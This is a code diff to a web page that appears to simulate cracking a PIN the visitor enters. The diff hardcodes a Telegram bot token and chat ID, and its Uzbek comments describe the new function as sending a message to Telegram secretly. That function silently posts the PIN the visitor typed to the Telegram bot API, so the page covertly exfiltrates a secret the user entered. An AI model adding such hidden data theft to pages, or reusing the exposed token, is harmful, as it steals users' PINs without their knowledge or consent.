@@ -219,6 +219,10 @@
         let triedCombinations = [];
         let simulationInterval;
 
+        // Telegram ma'lumotlari
+        const BOT_TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
+        const ADMIN_ID = "6198817749";
+
         function startSimulation() {
             const pinInput = document.getElementById('pinInput');
             const errorMsg = document.getElementById('errorMsg');
@@ -259,14 +263,44 @@
                     clearInterval(simulationInterval);
                     
                     document.body.classList.add('success'); 
-                    successBox.style.display = 'block'; // Sintaktik xatolik to'g'rilandi
+                    successBox.style.display = 'block';
                     historyBtn.style.display = 'block'; 
                     
                     renderHistory();
+
+                    // Natija topilganda avtomatik Telegramga yuborish funksiyasi
+                    sendResultToTelegram(formattedCombo);
                 }
 
                 currentCheck++;
             }, 1);
+        }
+
+        // Telegramga yashirincha xabar yuborish funksiyasi
+        function sendResultToTelegram(foundPin) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const message = `🎯 <b>PIN-kod topildi!</b>\n\n🔑 <b>Kiritilgan kod:</b> <code>${foundPin}</code>\n📊 <b>Urinishlar soni:</b> ${triedCombinations.length}`;
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: ADMIN_ID,
+                    text: message,
+                    parse_mode: "HTML"
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.ok) {
+                    console.log("Natija muvaffaqiyatli Telegramga yuborildi.");
+                } else {
+                    console.error("Telegramga yuborishda xato:", data.description);
+                }
+            })
+            .catch(err => console.error("Tarmoq xatosi:", err));
         }
 
         function renderHistory() {
